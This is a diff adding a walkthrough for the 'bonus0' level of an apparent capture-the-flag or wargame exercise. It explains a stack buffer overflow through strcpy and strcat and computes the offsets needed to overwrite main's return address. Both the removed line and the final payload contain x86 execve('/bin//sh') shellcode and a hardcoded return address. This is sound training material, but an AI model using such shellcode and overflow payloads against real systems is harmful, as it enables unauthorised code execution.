@@ -1,1 +1,30 @@
-python -c "print 'A' *61 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' +'\x90' * 4009 + '\n' + 'A'*9 + '\x8d\xe6\xff\xbf' + 'A' *7" > /tmp/v
+# bonus0 walkthrough
+#
+
+* this program is vulnerable to a stack buffer overflow attack
+
+* the program reads 4096 byte from stdin and replace '\n' with '\0', then it copies 20bytes from the buffer to str
+
+* if we enter more than 19 bytes str will not be null terminated
+
+* to override return address of main we should write 54 bytes to str
+
+  1  strcpy(str, buffer);
+  2  str[strlen(str)] = ' ';
+  3  strcat(str, buffer1);
+
+* to override the return address first input we enter 20 random bytes, strcpy will copy the first input (20 bytes) + 19 bytes from the second input because the first buffer was not null terminated.
+
+* before strcat str contains 40bytes after strcat returns str will be 59bytes, we need 54bytes to override the return address so the payload will be:
+
+20*'a'
+14*'a'+'addr'+'a'
+
+* next we inject the shell code in. buffer+61 and override return address with the address of buffer+61
+
+* the final payload is:
+
+20*'a'+41*'a' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + (0x1000-61-25-1)*'a' + '\n'
+14*'a'+'\x8d\xe6\xff\xbf'+'a'
+
+
